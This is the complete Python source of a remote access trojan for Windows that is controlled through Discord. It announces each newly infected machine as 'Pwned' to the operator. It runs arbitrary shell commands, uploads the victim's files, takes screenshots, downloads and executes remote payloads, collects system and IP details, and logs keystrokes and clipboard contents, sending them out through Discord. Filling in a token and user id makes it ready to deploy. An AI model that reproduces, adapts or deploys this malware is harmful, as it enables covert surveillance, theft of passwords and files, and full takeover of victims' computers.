import pyWinhook
import win32clipboard
import discord
from discord.ext import tasks
import asyncio
import random
import shlex
from pyautogui import screenshot
from pythoncom import PumpMessages
import platform as plt
import socket
import threading
import requests
import subprocess
import io, re, os, string

class BotStarted(discord.Client):

    def reconBot(self):
        try:
            info={}
            info['platform']=plt.system()
            info['platform-version']=plt.version()
            info['hostname']=socket.gethostname()
            info['public-ip']=requests.get('https://api.ipify.org').text
            info_str = ''
            for key, value in info.items():
                info_str += '%s = %s\n' % (key, value)
            return info_str
        except Exception:
            pass

    def KeyStroke(self,event):
            try:
                if event.Ascii > 32 and event.Ascii < 127: 
                    self.keys_text += chr(event.Ascii)
                else:
                    if event.Key == "V": 
                        win32clipboard.OpenClipboard()
                        pasted_value = win32clipboard.GetClipboardData()
                        win32clipboard.CloseClipboard()
                        paste = "[PASTE: %s]" % (pasted_value)
                        self.keys_text += paste
                    elif event.Key == 'Space':
                        self.keys_text += ' '
                    else:
                        env = "[%s]" %(event.Key)
                        self.keys_text += env
                return True
            except:
                pass

    def KeyGrabber(self):
        self.keys_text = ''
        bo = pyWinhook.HookManager()
        bo.KeyDown = self.KeyStroke
        bo.HookKeyboard()
        PumpMessages()

    @tasks.loop(seconds=0.1)
    async def keys_share(self):
        await asyncio.sleep(int(self.time_k))
        arr = io.StringIO(self.keys_text)
        ch = await client.fetch_user(000000) # Replace it with your discord user id
        fln = self.botname[1:] + '.txt'
        await ch.send(file=discord.File(arr, filename=fln))

    async def on_ready(self):
        self.botname = '$Bot-' + ''.join(random.sample((string.digits + string.ascii_letters), 6))
        self.name_text = f'**{self.botname}**\n'
        osname = os.getenv('USERNAME')
        ch = await client.fetch_user(000000) # Replace it with your discord user id
        await ch.send(f'Pwned: {self.botname} == {osname}')

    async def on_message(self, message):
        if message.author == client.user:
            return
        
        if message.content.startswith('$b') or message.content.startswith(self.botname):
            if '$help' in message.content:
                helper = '$wake\n$shell\n$upload arq1|arq2\n$grab\n$down_exec\n$klogging\n$sysinfo\n$test_keys'
                await message.channel.send(helper)

            if '$wake' in message.content:
                msg = f'**{self.botname}**'
                await message.channel.send(msg)

            if '$shell' in message.content:
                args = re.search(r'\$shell ', message.content)
                args = shlex.split(message.content[args.end():])
                sub = subprocess.Popen(args, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                s_out, s_err = sub.communicate()
                out, err = s_out.decode('iso-8859-1'), s_err.decode('iso-8859-1')
                sub = self.name_text + out + err
                test = [sub[x:x+2000] for x in range(0, len(sub), 2000)]
                for i in test:
                    await message.channel.send(i)
            
            if '$upload' in message.content:
                args = re.search(r'\$upload ', message.content)
                args = message.content[args.end():].split('|')
                for arg in args:
                    if os.path.exists(arg):
                        await message.channel.send(file=discord.File(arg))
                    else:
                        await message.channel.send('File not found!')

            if '$grab' in message.content:
                arr = io.BytesIO()
                pict = screenshot()
                pict.save(arr, format='PNG')
                arr.seek(0)
                await message.channel.send(file=discord.File(arr, filename='image.png'))

            if '$down_exec' in message.content:
                m = re.search(r'\$down_exec ', message.content)
                args = message.content[m.end():].split()[0]
                t = requests.get(args)
                file_n = os.path.basename(args)
                if '$local' in message.content:
                    m = re.search(r'\$local ', message.content)
                    args = message.content[m.end():]
                    file_n = args + file_n
                with open(file_n, 'wb') as f:
                    f.write(t.content)
                    f.close()
                s = subprocess.Popen(os.path.abspath(file_n), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                out, err = s.communicate()
                if not err.decode('iso-8859-1'):
                    await message.channel.send('Execute without errors.')

            if '$klogging' in message.content:
                m = re.search(r'\$klogging ', message.content)
                self.time_k = message.content[m.end():]
                t = threading.Thread(target=self.KeyGrabber)
                t.start()
                self.keys_share.start()
                await message.channel.send(f'{self.botname} logging keys...')

            if '$sysinfo' in message.content:
                result = self.reconBot()
                result = self.name_text + result
                await message.channel.send(result)

            if '$test_keys' in message.content:
                text = self.keys_text
                arr = io.StringIO(text)
                arr.seek(0)
                fln = self.botname[1:] + '.txt'
                await message.channel.send(file=discord.File(arr, filename=fln))

if __name__ == '__main__':
    token = 'PUT YOUR TOKEN HERE!'
    while 1:
        try:
            client = BotStarted()
            client.loop.run_until_complete(client.start(token))
        except:
            client.loop.run_until_complete(client.logout())
            for t in asyncio.all_tasks(loop=client.loop):
                if t.done():
                    t.exception()
                    continue
                t.cancel()
                try:
                    client.loop.run_until_complete(asyncio.wait_for(t, 5, loop=client.loop))
                    t.exception()
                except (asyncio.InvalidStateError, asyncio.TimeoutError, asyncio.CancelledError):
                    pass

        client = BotStarted(loop=client.loop)

